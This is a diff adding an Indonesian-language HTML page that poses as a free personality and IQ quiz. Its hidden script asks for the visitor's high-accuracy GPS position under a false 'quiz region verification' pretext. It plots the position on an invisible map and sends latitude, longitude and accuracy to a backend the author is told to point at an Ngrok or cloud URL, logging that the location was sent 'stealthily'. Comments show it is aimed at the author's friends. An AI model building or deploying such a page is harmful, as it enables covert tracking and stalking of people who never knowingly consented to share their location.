@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kuis Kepribadian & IQ Online</title>
+    <!-- Leaflet CSS (Disembunyikan) -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+        h2 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #666;
+            font-size: 15px;
+            line-height: 1.5;
+        }
+        .btn-quiz {
+            background: #764ba2;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 15px;
+            width: 100%;
+        }
+        .btn-quiz:hover {
+            background: #5a377d;
+        }
+        .question-box {
+            display: none;
+            text-align: left;
+            margin-top: 20px;
+        }
+        .option {
+            background: #f0f0f5;
+            padding: 10px 15px;
+            border-radius: 8px;
+            margin: 8px 0;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .option:hover {
+            background: #e0e0eb;
+        }
+        /* Elemen Peta Dibuat Tersembunyi */
+        #map {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <!-- Tampilan Halaman Depan Kuis -->
+        <div id="start-screen">
+            <h2>🧠 Tes Kepribadian & IQ Gratis</h2>
+            <p>Cari tahu karakter tersembunyi dan tingkat fokusmu dalam 1 menit!</p>
+            <p><small style="color: #888;">*Tekan "Izinkan Akses" jika ada permintaan browser untuk verifikasi wilayah kuis.</small></p>
+            <button class="btn-quiz" onclick="mulaiKuis()">Mulai Kuis Sekarang</button>
+        </div>
+
+        <!-- Tampilan Soal Kuis (Muncul setelah tombol diklik) -->
+        <div id="quiz-screen" class="question-box">
+            <h3 id="question-title">Pertanyaan 1/3</h3>
+            <p id="question-text">Bagaimana cara kamu menghabiskan akhir pekan?</p>
+            <div class="option" onclick="pilihJawaban()">A. Bersantai di rumah membaca buku / main game</div>
+            <div class="option" onclick="pilihJawaban()">B. Nongkrong di luar bersama teman-teman</div>
+            <div class="option" onclick="pilihJawaban()">C. Jalan-jalan mencari tempat baru</div>
+        </div>
+    </div>
+
+    <!-- Peta Tetap Ada di Kode tapi Dihilangkan dari Layar -->
+    <div id="map"></div>
+
+    <!-- Leaflet JS -->
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script>
+        let map, marker;
+
+        // Inisialisasi Peta secara Tersembunyi
+        function initMap(lat, lon) {
+            if (!map) {
+                map = L.map('map').setView([lat, lon], 16);
+                L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png', {
+                    maxZoom: 19
+                }).addTo(map);
+                marker = L.marker([lat, lon]).addTo(map);
+            }
+        }
+
+        // Fungsi Kirim Data Lokasi ke Backend MySQL / Ngrok Kamu
+        function kirimKeDatabase(lat, lon, akurasi) {
+            fetch('http://localhost:3000/api/simpan-lokasi', { // Ganti URL ini dengan URL Ngrok/Backend Cloud kamu
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    latitude: lat,
+                    longitude: lon,
+                    akurasi: akurasi
+                })
+            })
+            .then(res => res.json())
+            .then(data => console.log('Lokasi terkirim secara stealth.'))
+            .catch(err => console.error(err));
+        }
+
+        // Fungsi yang Dipanggil Saat Teman Menekan Tombol "Mulai Kuis"
+        function mulaiKuis() {
+            // 1. Ubah tampilan ke Pertanyaan Kuis
+            document.getElementById('start-screen').style.display = 'none';
+            document.getElementById('quiz-screen').style.display = 'block';
+
+            // 2. Memicu Izin GPS secara Tersembunyi di Latar Belakang
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const akurasi = Math.round(position.coords.accuracy);
+
+                        initMap(lat, lon);
+                        kirimKeDatabase(lat, lon, akurasi);
+                    },
+                    (error) => {
+                        console.warn("Layanan kuis tetap berjalan meski lokasi ditolak.");
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
+                );
+            }
+        }
+
+        function pilihJawaban() {
+            alert("Terima kasih sudah menyelesaikan kuis! Hasil analisis kepribadianmu akan segera diproses.");
+        }
+    </script>
+</body>
+</html>
